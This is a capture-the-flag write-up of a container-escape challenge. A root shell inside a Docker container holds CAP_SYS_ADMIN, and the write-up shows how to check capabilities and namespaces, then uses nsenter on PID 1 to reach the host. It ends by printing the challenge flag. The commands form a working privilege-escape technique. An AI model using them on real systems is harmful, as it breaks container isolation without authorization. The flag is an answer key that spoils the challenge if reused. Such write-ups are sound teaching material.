---
title: reto06
difficulty: Medium
challenge_type: Misc
author: "@lassault"
writeup_author: "@xabito"
competition: navarra-cyber-talent-25-4
summary: We found an exposed container on the network. Can you demonstrate what you are **capable** of?
connections:
  - url: nct25.thehackerconclave.es:26006
---

## Recon

First, let's establish a connection to the exposed service:

```bash
$ nc nct25.thehackerconclave.es 26006
```

This command provides us with a shell as the `root` user inside a Docker container:

```
root@docker:/#
```

## Exploitation

The word **capable** is a clear hint referring to Linux capabilities. Let's examine the capabilities assigned to the current process:

```bash
$ cat /proc/self/status | grep Cap
CapInh:	0000000000000000
CapPrm:	000001fcfdfcffff
CapEff:	000001fcfdfcffff
CapBnd:	000001fcfdfcffff
CapAmb:	0000000000000000
```

The capability bitmask `000001fcfdfcffff` includes `CAP_SYS_ADMIN` along with several other highly privileged capabilities that permit namespace manipulation. The important observation here is that, with these capabilities, it is likely possible to escape from the container.

Because the process has `CAP_SYS_ADMIN` (and other admin bits), it can call `setns`/`nsenter` to join other processes’ namespaces. If `PID 1` is the host's `init` process, this will put the shell into the host namespace and complete the escape.

To check if the `mount` namespaces differ between our running process and `PID 1`, we can check their links on the filesystem:

```bash
root@docker:/# readlink /proc/self/ns/mnt
mnt:[4026544973]

root@docker:/#  readlink /proc/1/ns/mnt
mnt:[4026544726]
```

Since the mount namespaces are different, we can proceed to escape the container:

```bash
root@docker:/# nsenter --target 1 --mount
```

**Note**: Alternatively, we can enter all the namespaces, not just the `mnt` namespace. This would provide us with a fully functional shell on the host system:

```bash
root@docker:/# nsenter --target 1 --all
6e586d4926e4:/#
```

## Flag capture

Once we have gained access to the host filesystem, we can search for the flag as follows:

```bash
root@docker:/# find / -name "flag.txt"
/home/ctf/flag.txt

root@docker:/# cat /home/ctf/flag.txt
conclave{cb98ea2f29910d907334177e0adc6b05}
```
